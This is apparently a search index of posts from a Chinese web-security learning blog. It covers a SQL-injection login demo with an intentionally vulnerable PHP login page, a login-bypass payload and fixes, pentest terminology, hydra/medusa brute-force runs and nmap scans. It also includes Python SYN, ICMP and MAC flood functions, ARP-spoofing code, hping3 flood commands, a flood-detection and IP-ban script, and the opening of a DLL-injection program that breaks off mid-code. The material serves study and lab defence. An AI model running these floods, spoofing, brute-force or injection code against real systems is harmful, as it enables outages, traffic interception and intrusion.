$new_sql = \"update user_account set failcount = failcount+1,lasttime=now() where username= ?\";\n        $stmt = $conn->prepare($new_sql);\n        $stmt->bind_param(\"s\",$username);\n        $stmt->execute();\n    }\n\n?>\n```\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"登录漏洞-实现原理","url":"/2023/11/09/Web渗透/登录漏洞-实现原理/","content":"\n1、环境配置\n\nxmapp +centos7\n\n登录代码：\n\nlogin.html\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Login</title>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n\n\n</head>\n<body>\n    <h2>登录</h2>\n    <!-- form提交方式 -->\n\n    <form action=\"login.php\" method=\"POST\">\n        <label for=\"username\">用户名:</label>\n        <input type=\"text\" id=\"username\" name=\"username\" required><br><br>\n        \n        <label for=\"password\">密码:</label>\n        <input type=\"password\" id=\"password\" name=\"password\" required><br><br>\n        \n\n        <label for=\"captcha\">验证码:</label>\n        <input type=\"text\" id=\"captcha\" name=\"captcha\" required><br><br>\n\n        <input type=\"submit\" value=\"登录\"> \n\n    </form>\n\n\n</body>\n</html>\n```\n\nlogin.php\n\n```\n<?php\n\n \n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $captcha = $_POST['captcha'];\n\n    if ($captcha !=='0000')\n    {\n        die('vcode-error');\n    }\n\n    $conn = mysqli_connect('127.0.0.1','root','123456','learn');\n\n    if (!$conn) {\n        die(\"连接失败: \" . mysqli_connect_error());\n    }\n\n    mysqli_query($conn,\"set names utf8\");\n    $sql = \"select * from  user_account where username='$username' and password='$password'\";\n    $result = mysqli_query($conn,$sql);\n\n    if (mysqli_num_rows($result) == 1) {\n       echo \"login-success\";\n       echo \"<script>location.href='hello.php'</script>\";\n    }\n    else{\n        echo \"login-fail\";\n        echo \"<script>location.href='login.php'</script>\";\n    }\n\n?>\n```\n\n2、测试sql 注入\n\n在登录页面输入单引号作为用户名，密码123456，验证码0000，响应如下\n\n![image-20231109211847591](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231109211847591.png)\n\n示例的漏洞：\n\n（1）单引号可以成功引起SQL语句报错，说明后台没有对单引号进行处理，可能存在注入点\n\n```\n示例攻击payload\n\nusername=x' or userid=1#'  \n\nusername=x%27+or+userid%3D1%23%27&password=admin123&captcha=0000\n\nsql 语句\n\nselect * from  user_account where username='x' or userid=1#' ' and password='admin123';\n\n真实执行的是 select * from  user_account where username='x' or userid=1 \n\n（#） 注释了后面的语句\n```\n\n（2）在报错里面暴露了敏感信息，当前代码的路径\n\n/opt/lamp/htdocs/learn/login.php\n\n注入类的核心：\n\n（1）拼接为有效的语句或者代码\n\n（2）确保完成了闭合，并且可以改变原本的执行逻辑\n\n3、总结\n\n上述代码总共有6个漏洞\n\n```\n1、hello.php 页面谁都可以访问，未进行登录判断(中)\n2、在登录框输入'作为用户名，会暴露login.php的完整路径，泄露敏感信息(低)\n3、保存用户数信息的数据库中，密码明文保存（中）\n4、登录页可以sql注入，轻易实现登录（高）\n5、login.php使用了万能验证码（中）\n6、登录功能可以被爆破，没有爆破防护（中）\n```\n\n4、解决以上问题\n\n问题1解决方案：\n\n```\n\n新增页面common.php中\n\n<?php\n\tsession_start();\n?>\n\nlogin.php 修改如下\n\ninclude \"common.php\";\nif (mysqli_num_rows($result) == 1) {\n\techo \"login-success\";\n\t$_SESSION['username'] = $username;\n\t$_SESSION['islogin'] = 'true';\n}\t\n\nhello.php 修改如下\n<?php\ninclude \"common.php\";\n\nif (isset($_SESSION['islogin']) and $_SESSION['islogin'] == 'true')\n{\n    echo \"hello world\";\n}\nelse{\n    die(\"未登录，无法访问\");\n}\n?>\n```\n\n问题2 解决办法：\n\n```\n\nmysql_query 后新增 or die('sql语句执行错误');\n\n```\n\n问题3 解决办法\n\n```\nuser_account表中 password 必须是32位\n用户注册时，使用md5函数加密后保存。\n```\n\n问题4 解决办法：\n\n```\nSQL 注入防护\n\n1、逻辑层面\n\n用户名和密码的比对不要放在一起\n先比对用户名，查询是否数据库中是否有一条记录，存在再进行密码的比对\n\n    $sql = \"select * from  user_account where username='$username'\";\n\n    $result = mysqli_query($conn,$sql) or die('sql语句执行错误');\n    if (mysqli_num_rows($result) == 1) \n    {\n        $row = mysqli_fetch_assoc($result);\n        // var_dump($row);\n        if($password == $row['password'])\n        {\n            echo \"login-success\";\n            echo \"<script>location.href='hello.php'</script>\";\n            \n            $_SESSION['username'] = $username;\n            $_SESSION['islogin'] = 'true';\n\n        }\n        else{\n            echo \"login-fail\";\n            echo \"<script>location.href='login.html'</script>\";\n        }\n    } \n    else{\n        echo \"login-fail\";\n        echo \"<script>location.href='login.html'</script>\";\n    }\n\n2、强制专业特殊符号如引号\n\nselect * from  user_account where username='x' or userid=1#' ' and password='admin123';\n使用addslashes函数转移后，就编成\n\nselect * from  user_account where username='x\\' or userid=1#\\'' and password='admin123';\n\n3、Mysqli的预处理功能\n\nmysqli的预处理函数会转移引号等参数，避免大多数的SQL注入\n\n$sql = \"select userid,username,password from user_account where username= ?\";\n$stmt = $conn->prepare($sql);\n$stmt->bind_param(\"s\",$username);\n// 绑定结果参数\n$stmt->bind_result($userid,$username1,$password1);\n$stmt->execute();\n$stmt->store_result();\n\nif($stmt->num_rows == 1)\n{\n$stmt->fetch();\nif($password == $password1)\n{\necho \"login-success\";\necho \"<script>location.href='hello.php'</script>\";\n\n//登录成功后记录session变量\n\n$_SESSION['username'] = $username;\n$_SESSION['islogin'] = 'true';\n}\nelse{\necho \"login-fail\";\necho \"<script>location.href='login.html'</script>\";\n}\n\n}\n\n```\n\n5、MYSQL 开启 执行日志\n\n```\nuse mysql;\n\nset GLOBAL log_output = 'TABLE';\nSET GLOBAL general_log = 'ON';\n\nshow VARIABLES like 'general_log';\n```\n\n![image-20231110231422545](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231110231422545.png)\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"渗透测试基础","url":"/2023/11/06/Web渗透/渗透测试基础/","content":"\n一、渗透测试基础\n\n1、**概念**\n\n渗透测试是一种模拟恶意攻击者的技术和方法，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试和评估方法。\n\n2、类型\n\n黑盒测试、白盒测试、灰盒测试\n\n3、**生命周期**\n\n漏洞挖掘->0-day->1-day->N-day->修补\n\n4、需要授权的场景\n\n（1）为客户提供渗透测试服务\n\n  (2) 针对非客户的自有系统，建议获取授权后测试\n\n（3）保留任何可以授权的证据\n\n5、**不需要授权的场景**\n\n（1）针对开源的产品系统，如Linux、Apache、Tomcat、MariaDB、Redis等\n\n（2）针对自己闭源的产品型软件，如Windows 、QQ等\n\n  (3)    众测：厂商委托安全平台，如补天、漏洞盒子等\n\n6、**漏洞库**\n\nCVE  https://cve.mitre.org/cve/search_cve_list.html\n\nCWE、https://cwe.mitre.org/data/definitions/1337.html\n\nOWASP https://owasp.org.www-project-top-ten\n\nCNVD https://www.cnvd.org.cn\n\nCNNVD https://cnnvd.org.cn\n\n漏洞盒子 https://www.vulbox.com\n\n补天  https://www.butian.net\n\n7、**渗透测试流程**\n\n前期交互-》情报收集-》汇总分析-》渗透攻击-》后渗透-》报告\n\n8、**渗透测试的主流工具**\n\n域名注册信息：Whois 在线网站，Nslookup\n\n在线漏洞引擎：Fofa、 Shodan、zoomeyes.org\n\n指纹识别: CMS识别工具  操作系统识别工具\n\n端口扫描：Nmap、Masscan\n\n网站路径扫描: 御剑、WWWSCAN\n\n主机漏洞扫描: Nessus\n\nweb应用漏洞扫描：AWVS  Xray  APPSCAN\n\n抓包：Wireshark、科来\n\nSql注入： Sqlmap\n\n集成攻击平台:  msf、BP、Cobalt Strike\n\n反编译工具：IDA、OD、Winhex\n\nshell连接工具：中国菜刀、蚁剑\n\n系统hash破解： Pwdump、Shadow、LC5/JOHN、www.objectctif-securite.ch \n\n内网抓取hash： WCE、Mimikatz、Procdumo+Mimikatz、John、Getpass\n\n公开exp： structs2 工具集、 JBoss反序列化工具 、Ms08-067\n\n9、**专业术语**\n\nwebshell:  基于web开发语言（PHP Java Python C# go javascript） 制作的木马程序\n\npayload: 有效载荷\n\n肉鸡：攻击者控制的主机\n\nPOC  ： Proof of Concept 概念验证，用于发现漏洞后编写程序进行漏洞验证，确认漏洞的存在\n\nEXP:  漏洞利用\n\nCC: 挑战黑洞\n\nC2:  Command & control 命令控制服务器\n\nFUZZ:  模糊测试，基于规则或者字典进行快速的测试，发现漏洞点\n\nDDOS: 分布式拒绝服务攻击\n\n横向移动、内网渗透：获取到内网某一个主机权限后，继续在局域网进行扫描等发现其他主机并入侵\n\n社工：社会工程学（骗）\n\n社工库：一些正规或者非正规渠道获取到的各种个人数据\n\nWAF： Web应用防火墙\n\nIDS：入侵检测系统，检测后预警\n\nIPS：入侵防御系统、检测并防御\n\n脆弱项：Weakness  可能存在风险\n\n威胁：Threat   明确存在风险\n\n攻击：Attack   直接利用了安全漏洞\n\n漏洞：Vulnerability  \n\nAPT: Advanced Persistent Threat\n\n提权：普通权限提升到系统权限等\n\n越权：A有了B的权限\n\nSEIM：安全管理平台，态势感知 系统\n\n安全左移：安全提前到研发阶段（安全分析、安全设计、安全架构、安全编码、安全测试）\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"scapy 使用","url":"/2023/11/01/编程/scapy使用/","content":"\n1、scapy 安装\n\npip install scapy\n\n2、基本功能\n\n监听流量，分析流量，编辑流量数据包（数据链路层，网络层，传输层）\n\n3、基本使用\n\n- shell使用\n\n  ```\n  命令行下直接执行scapy\n  # 显示接口信息\n   show_interfaces()\n   # 抓包\n   pkg= sniff(count=100,filter=\"icmp\")\n   pkg.summary()\n   # 发送数据 5个数据包，间隔为1 payload=\"HHHHHHHHHHHHHHHHHHHHHHHHHHHH\"\n   send(IP(dst=\"192.168.101.6\")/ICMP()/\"HHHHHHHHHHHHHHHHHHHHHHHHHHHH\")\n   #接收数据包\n    pkg = sr1(IP(dst=\"192.168.101.6\")/ICMP()/\"HHHHHHHHHHHHHHHHHHHHHHHHHHHH\")\n    # 发送/接收arp 数据包\n    pkg = sr1(ARP(psrc='192.168.101.8',pdst=\"192.168.101.6\"))\n    \n    # 显示协议字段\n    >>> ARP().show()\n      ###[ ARP ]###\n        hwtype    = Ethernet (10Mb)\n        ptype     = IPv4\n        hwlen     = None\n        plen      = None\n        op        = who-has\n        hwsrc     = 4c:ed:fb:94:b4:25\n        psrc      = 192.168.101.8\n        hwdst     = 00:00:00:00:00:00\n        pdst      = 0.0.0.0\n  \n  ```\n\n  ![image-20231101221319966](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231101221319966.png)\n\n- python\n\n  等待更新","tags":["编程"],"categories":["编程"]},{"title":"工具篇","url":"/2023/10/31/黑客工具/工具篇/","content":"\n1、爆破工具\n\n- hydra\n\n```shell\nSyntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]\n\nOptions:\n  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE\n  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE\n  -C FILE   colon separated \"login:pass\" format, instead of -L/-P options\n  -M FILE   list of servers to attack, one entry per line, ':' to specify port\n  -t TASKS  run TASKS number of connects in parallel per target (default: 16)\n  -U        service module usage details\n  -m OPT    options specific for a module, see -U output for information\n  -h        more command line options (COMPLETE HELP)\n  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)\n  service   the service to crack (see below for supported protocols)\n  OPT       some service modules support additional input (-U for module help)\n\nSupported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp\n\n```\n\n示例：\n\n```shell\n└─$ hydra -l cleint -P ./password.txt 192.168.101.7 ssh          \nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-31 10:42:10\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task\n[DATA] attacking ssh://192.168.101.7:22/\n[22][ssh] host: 192.168.101.7   login: cleint   password: qwe123\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 10:42:12\n\n```\n\n- medusa\n\n```\n└─$ medusa -h 192.168.101.7 -u cleint -P ./password.txt -M ssh    \nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n\nACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: 123456 (1 of 2 complete)\nACCOUNT CHECK: [ssh] Host: 192.168.101.7 (1 of 1, 0 complete) User: cleint (1 of 1, 0 complete) Password: qwe123 (2 of 2 complete)\nACCOUNT FOUND: [ssh] Host: 192.168.101.7 User: cleint Password: qwe123 [SUCCESS]\n\n```\n\n2、端口扫描工具\n\nnmap\n\n- 扫描操作系统\n\n  原理 ：**Nmap维护一个nmap-os-db数据库**，存储了上千种操作系统信息，简单一点来说,[Nmap](https://so.csdn.net/so/search?q=Nmap&spm=1001.2101.3001.7020)通过TCP/IP协议栈的指纹信息来识别目标主机的操作系统信息，这**主要是利用了RFC标准中，没有强制规范了TCP/IP的某些实现,于是不同的系统中TCP/IP的实现方案可能都有其特定的方式，这些细节上的差异，给nmap识别操作系统信息提供了方案**，具体一点说,Nmap分别**挑选一个close和open的端口，分别发送给一个经过精心设计的TCP/UDP数据包，当然这个数据包也可能是ICMP数据包**。然后根据收到返回报文,生成一份系统指纹。通过对比检测生成的指纹和nmap-os-db数据库中的指纹，来查找匹配的系统。最坏的情况下，没有办法匹配的时候,则用概率的形式枚举出所有可能的信息。\n\n```\n└─# nmap -O 192.168.101.10\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 09:57 EDT\nNmap scan report for 192.168.101.10 (192.168.101.10)\nHost is up (0.00090s latency).\nNot shown: 998 filtered ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: WAP\nRunning: Actiontec embedded, Linux\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel\nOS details: Actiontec MI424WR-GEN3I WAP\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 58.34 seconds\n\n```\n\n- 扫描IP地址  判断存活 基于ARP\n\n```\nnmap -sn 192.168.101.1/24\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:04 EDT\nNmap scan report for 192.168.101.1 (192.168.101.1)\nHost is up (0.0024s latency).\nMAC Address: 68:77:24:36:8F:BC (Unknown)\nNmap scan report for 192.168.101.2 (192.168.101.2)\nHost is up (0.0014s latency).\nMAC Address: 3C:06:A7:0C:63:B5 (Unknown)\nNmap scan report for 192.168.101.4 (192.168.101.4)\nHost is up (0.043s latency).\nMAC Address: E0:BB:9E:4B:EF:D0 (Seiko Epson)\nNmap scan report for 192.168.101.5 (192.168.101.5)\nHost is up (0.067s latency).\nMAC Address: 86:4A:E5:5B:64:C8 (Unknown)\nNmap scan report for 192.168.101.6 (192.168.101.6)\nHost is up (0.048s latency).\nMAC Address: 34:7D:F6:24:3E:1B (Intel Corporate)\nNmap scan report for 192.168.101.8 (192.168.101.8)\nHost is up (0.000054s latency).\nMAC Address: 4C:ED:FB:94:B4:25 (Asustek Computer)\nNmap scan report for 192.168.101.10 (192.168.101.10)\nHost is up (0.00019s latency).\nMAC Address: 00:0C:29:C8:D9:ED (VMware)\nNmap scan report for 192.168.101.7 (192.168.101.7)\nHost is up.\nNmap done: 256 IP addresses (8 hosts up) scanned in 9.40 seconds\n\n```\n\n- 扫描端口\n\n  ```shell\n  基于三次握手 namp -sT IP\n  基于SYN     nmap -sS IP\n  基于ACK     nmap -sA IP\n  不进行ping  nmap -Pn IP\n  \n  扫描端口和版本 nmap -sV IP\n  └─# nmap -sV 192.168.101.10 \n  Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-02 10:14 EDT\n  Nmap scan report for 192.168.101.10 (192.168.101.10)\n  Host is up (0.00033s latency).\n  Not shown: 997 filtered ports\n  PORT     STATE  SERVICE VERSION\n  22/tcp   open   ssh     OpenSSH 7.4 (protocol 2.0)\n  80/tcp   open   http    Apache httpd 2.4.56 ((Unix) OpenSSL/1.1.1t PHP/8.2.4 mod_perl/2.0.12 Perl/v5.34.1)\n  3306/tcp closed mysql\n  MAC Address: 00:0C:29:C8:D9:ED (VMware)\n  \n  指定端口   nmap -p10-200, -p21,22\n  ```\n\n3、子域名扫描工具\n\n- python ping/socket \n\n```python\n# 基于ping命令的子域名扫描\ndef subdomain_ping(domain):\n    with open('dict.txt', 'r') as f:\n        datalines = f.readlines()\n    for line in datalines:\n        sub_domain = line.strip() + '.' + domain\n        result = os.popen(f\"ping -n 1 -w 1000 {sub_domain}\").read()\n        if 'TTL' in result or \"请求超时\" in result:\n            print(f\"{sub_domain} 存在\")\n        if '找不到主机' in result:\n            print(f\"{sub_domain} 不存在\")\n\n\n# 基于socket库\n\ndef subdomain_socket(domain):\n    with open('dict.txt', 'r') as f:\n        datalines = f.readlines()\n    for line in datalines:\n        try:\n            sub_domain = line.strip() + '.' + domain\n            ip = socket.gethostbyname(sub_domain)\n            print(f\"{sub_domain} ip is {ip}\")\n        except:\n            pass\n\n```\n\n- windows Layer 子域名\n\n- kali  dnsenum\n- 在线子域名扫描网站\n\n4、后台扫描工具\n\n- 御剑\n\n  扫描后台地址\n\n5、web站点信息采集\n\n- kali  whatweb\n\n- whois信息  可通过whois 网站和python-whois 库\n\n- nslookup 可以用于确认是否使用CDN网络\n\n- fofa.info\n\n- shodan 网络设备查找 （如附近的摄像头、工控设备、路由器、打印机等）\n\n6、泛洪攻击\n\n基于协议通信，完成大流量高并发操作，导致目标主机各类资源消耗过多而无法提供正常的服务。（MAC地址泛洪，ARP泛洪欺骗）\n\n（1）正常通信\n\n（2）目标主机未配置很好的防护措施\n\n- socket 三次握手泛洪\n\n  ```python\n  # tcp 三次握手泛洪\n  def socket_flood(target_ip):\n      while True:\n          s = socket.socket()\n          s.connect((target_ip, 80))\n  \n  \n  ```\n\n  \n\n- scapy半连接泛洪\n\n  ```python\n  # scapy 半连接泛洪\n  def scapy_flood(target_ip):\n      while True:\n          pkg = IP(dst=target_ip) / TCP(dport=80, flags='S')\n          send(pkg, verbose=False)\n  ```\n\n  \n\n- TCP Land泛洪\n\n  ```python\n  # TCP Land 泛洪 (源IP和目的IP是一样的)\n  def land_flood(target_ip):\n      while True:\n          pkg = IP(src=target_ip, dst=target_ip) / TCP(dport=80, flags='S')\n          send(pkg, verbose=False)\n  \n  ```\n\n  \n\n- ICMP泛洪\n\n  ```python\n  # ICMP  泛洪  可以伪造src发包给target_ip,从而导致伪造的src主机全都发包给target_ip,即为反射攻击\n  def icmp_flood(target_ip):\n      while True:\n          payload = \"HHHHHHHHHHHHHHHHHHH\"\n          pkg = IP(dst=target_ip) / ICMP() / payload\n          send(pkg, verbose=False)\n  \n  ```\n\n  \n\n- ICMP 广播风暴\n\n  ```python\n  # 广播风暴\n  def icmp_broadcast():\n      while True:\n          payload = \"HHHHHHHHHHHHHHHHHHH\"\n          pkg = IP(dst=\"192.168.101.255\") / ICMP() / payload\n          send(pkg, verbose=False)\n  ```\n\n- ping命令\n\n  - 设置间隔很小\n  - 设置数据包很大\n\n  ```shell\n  ping -i 0.001 -s 2000 target_ip\n  ping -f target_ip\n  ```\n\n- MAC地址泛洪\n\n  定义随机MAC地址，不停的发送该条数据，交换机发现MAC表不存在，将其添加到MAC表中，从而填满MAC表，导致新的数据包无法添加到MAC表，只能广播或者交换机崩溃\n\n​\t\t工具 ： macof 用于对交换机进行mac地址表溢出 **sudo apt install dsniff**\n\n```python\n# MAC地址泛洪\ndef mac_flood():\n    while True:\n        random_smac = RandMAC(\"*:*:*:*:*:*\")\n        random_dmac = RandMAC(\"*:*:*:*:*:*\")\n        random_src_ip = RandIP()\n        random_dst_ip = RandIP()\n\n        pkg = Ether(src=random_smac, dst=random_dmac) / IP(src=random_src_ip, dst=random_dst_ip)\n        send(pkg, iface=\"\", loop=0)\n```\n\n虚拟机 默认使用混杂模式，可以监控到其他主机的流量\n\n- arp 攻击   \n\n  工具： arpspoof \n\n  原理 ： 发送arp请求，告诉被攻击主机，网关的MAC地址是我的MAC地址，使得流量转发到攻击主机。\n\n  ```\n  kali 攻击主机：192.168.198.128  ether 00:0c:29:c8:79:86 \n  被攻击主机win7: 192.168.198.133      00:0c:29:ff:57:a0\n  网关： 192.168.198.2                00:50:56:e1:2d:09\n  \n  # -i 网卡 -t target_ip fake_ip\n  arpspoof -i eth0  -t 192.168.198.133 192.168.198.2\n  0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86\n  0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86\n  0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86\n  0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86\n  \n  ```\n\n  win7 主机 MAC 表  如看已经欺骗成功，win7 上网失败\n\n  ![image-20231104150600273](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150600273.png)\n\n停止攻击后：\n\n![image-20231104150828129](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150828129.png)\n\narp 欺骗只需要多一步：\n\n打开kali 的流量转发功能，这样win7 就可以正常上网，但是流量相当于被劫持了，从kali 走了一道，流量被监控\n\n```\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n```python\n# python实现\n# 告诉被攻击主机我是网关，告诉网关，我是被攻击主机\ndef arp_flood():\n    while True:\n        target_ip = '192.168.198.133'\n        target_MAC = '00:0c:29:ff:57:a0'\n        gateway_ip = '192.168.198.2'\n        gateway_MAC = '00:50:56:e1:2d:09'\n        kali_MAC = '00:0c:29:c8:79:86'\n        # 发送给被攻击主机\n        # op=2 代表响应 op=1 ARP请求\n        pkg_target = Ether(src=kali_MAC, dst=target_MAC) / ARP(psrc=gateway_ip, pdst=target_ip, hwsrc=kali_MAC,hwdst=target_MAC,op=2)\n        send(pkg_target, iface=\"eth0\")\n        # 发送给网关\n        pkg_gateway = Ether(src=kali_MAC, dst=gateway_MAC) / ARP(psrc=target_ip, pdst=gateway_ip, hwsrc=kali_MAC,hwdst=gateway_MAC,op=2)\n        send(pkg_gateway, iface=\"eth0\")\n        time.sleep(1)\n```\n\n- hping3 泛洪攻击工具（还是多厉害）\n\n  ```\n  hping3 --flood -S --rand-source -p 端口 目标IP\n  ```\n\n- web站点压力测试工具\n\n  ab  wrk 等  netstat -s 可以查看数据包统计情况\n\n7、泛洪攻击的防御相关\n\n```shell\n# 检查 网络连接的数量\nnetstat -ant |wc -l 判断连接是否一直在增加\nnetstat -ant |grep SYN_RECV  半连接的数量\nnetstat -s |grep overflowed  可以检查是否出现全连接队列溢出的情况，连接队列溢出会导致无法与服务器建立新连接或者客户端出现大量 connection reset by peer 错误。\nnetstat -s |grep dropped     半连接队列溢出的情况\ntop -n 1  只刷新一次就退出，可看出消耗CPU较大的进程\nuptime   显示当前时间，运行时间，用户，1分钟，5分钟，15分钟的平均负载\n# 修改系统配置参数，增加TCP连接数量\n# 结束消耗CPU的进程或者服务\n# 防火墙封禁IP\n```\n\n```\n# 检测当前环境是否正在遭受攻击\n\nimport os\nimport time\n\n\n# 判断当前连接数量是否一直在增加 netstat -ant |wc -l\ndef connect_add_pers():\n    command = 'netstat -ant |wc -l'\n    start = time.time()\n    count_start = int(os.popen(command).read())\n    while True:\n        end = time.time()\n        count_end = int(os.popen(command).read())\n        if end - start > 1:\n            add_connect = count_end - count_start\n            break\n            # if add_connect > 1000:\n            #     return add_connect\n\n    return add_connect\n\n\n# netstat -ant |grep SYN_RECV  半连接的数量\n\ndef half_connect():\n    command = 'netstat -ant |grep SYN_RECV|wc -l'\n    count = int(os.popen(command).read())\n    return count\n\n\n# 半连接队列溢出的情况\n# 4839240 SYNs to LISTEN sockets dropped\ndef dropped_half_connect():\n    command = \"netstat -s |grep 'SYNs to LISTEN sockets dropped' |awk '{print $1}'\"\n    count = int(os.popen(command).read())\n    return count\n\n\n# 全连接队列溢出的情况\n# 809 times the listen queue of a socket overflowed\ndef dropped_full_connect():\n    command = \"netstat -s |grep 'times the listen queue of a socket overflowed' |awk '{print $1}'\"\n    count = int(os.popen(command).read())\n    return count\n\n\n# 找到CPU占用最高的进程\ndef top_1_process():\n    command = (\"top -n 1 |head -n 8|tail -n 1 |awk '{print $2}' |while read line;do ps -aux |grep $line |head -n 1 \"\n               \"|awk '{print $11}';done\")\n    process = os.popen(command).read().strip()\n    return process\n\n\n# 获取每个主机连接到本机的连接数，找到最多的IP，deny\ndef get_socket_connect():\n    count_command = \"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk '{print $1}'\"\n    count_max_socket = int(os.popen(count_command).read())\n    if count_max_socket > 100:\n        command = \"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk '{print $2}'\"\n        ip = os.popen(command).read().strip()\n        print(f\"{ip} 连接数为{count_max_socket} ,需要封禁，开始封禁\")\n        rule = f'rule family=\"ipv4\" source address=\"{ip}\" reject'\n        all_rules = os.popen(\"firewall-cmd --reload && firewall-cmd --list-all\").read()\n        time.sleep(2)\n        if rule in all_rules:\n            print(f\"{rule} 已存在\")\n            return\n        reject_cmd = f\"firewall-cmd --add-rich-rule='{rule}' --permanent\"\n        # print(reject_cmd)\n        reload_cmd = \"firewall-cmd --reload\"\n        # print(reload_cmd)\n        result1 = os.popen(reject_cmd).read().strip()\n        time.sleep(1)\n        result2 = os.popen(reload_cmd).read().strip()\n        time.sleep(1)\n        if result1 == 'success' and result2 == 'success':\n            print(\"封禁完成\")\n        else:\n            print(\"封禁失败，请检查\")\n\n\n# uptime 1分钟、5分钟、15分钟内的负载信息\n# 如果1分钟的cpu大于50，代表可能遭遇了攻击\ndef get_cpuload_by_uptime():\n    result = os.popen('uptime').read().strip()\n    result = result.replace(': ', \",\")\n    result_list = result.split(\",\")\n    cpu_1_avg = float(result_list[-3])\n    # cpu_5_avg = float(result_list[-2])\n    # cpu_15_avg = float(result_list[-1])\n    return cpu_1_avg\n\n\n# 采集netstat -ant 的连接数量\n# 如果连接大于500 代表可能遭遇了攻击\ndef get_conn_count_by_netstat():\n    command = 'netstat -ant |wc -l'\n    count = int(os.popen(command).read().strip())\n    return count\n\n\nif __name__ == \"__main__\":\n    # print(f\"当前每秒钟连接增加数量为{connect_add_pers()}\")\n    # print(f\"当前网络中存在的半连接数量为{half_connect()}\")\n    # print(f\"当前网络中半连接溢出数量为{dropped_half_connect()}\")\n    # print(f\"当前网络中全连接溢出数量为{dropped_full_connect()}\")\n    # print(f\"当前系统中占用CPU最高的进程为{top_1_process()}\")\n    # while True:\n    #     get_socket_connect()\n    while True:\n        print(f\"CPU-Load: {get_cpuload_by_uptime()},conn-count: {get_conn_count_by_netstat()}\")\n\n```\n\n","tags":["黑客工具"],"categories":["黑客工具"]},{"title":"创建远程线程-NtCreateThreadEx","url":"/2023/10/28/编程/创建远程线程/","content":"\n### 创建远程线程的学习\n\n1.目标 ： 实现对普通进程，服务进程 32/64位程序的通用注入\n\n2、主要函数 NtCreateThreadEx\n\n3、代码\n\n```\n#pragma warning(disable: 4996)\n#include <iostream>\n#include <Windows.h>\nBOOL IsVistaOrLater();\nBOOL MyCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuff);\nBOOL InjectDll(DWORD dwPid, char* szDllName);\nint main(int argc,char*argv[])\n{\n    \n    DWORD dwPid = (DWORD)atoi(argv[1]);\n    char* szDllName = argv[2];\n    std::cout << \"dwPid is \" << dwPid << std::endl;\n    std::cout << \"szDllName is \" << szDllName << std::endl;\n\n    if (dwPid != 0 && strlen(szDllName) > 0)\n    {\n        if (InjectDll(dwPid, szDllName))\n        {\n            printf(\"注入成功\\n\");\n        }\n        else\n        {\n            printf(\"注入失败\\n\");\n        }\n    }\n    std::cout << \"Hello World!\\n\";\n}\n#ifdef _WIN64\n\ntypedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)\n(\n    OUT PHANDLE hThread,\n    IN ACCESS_MASK DesiredAccess,\n    IN PVOID ObjectAttributes,\n    IN HANDLE ProcessHandle,\n    IN PVOID lpStartAddress,\n    IN PVOID 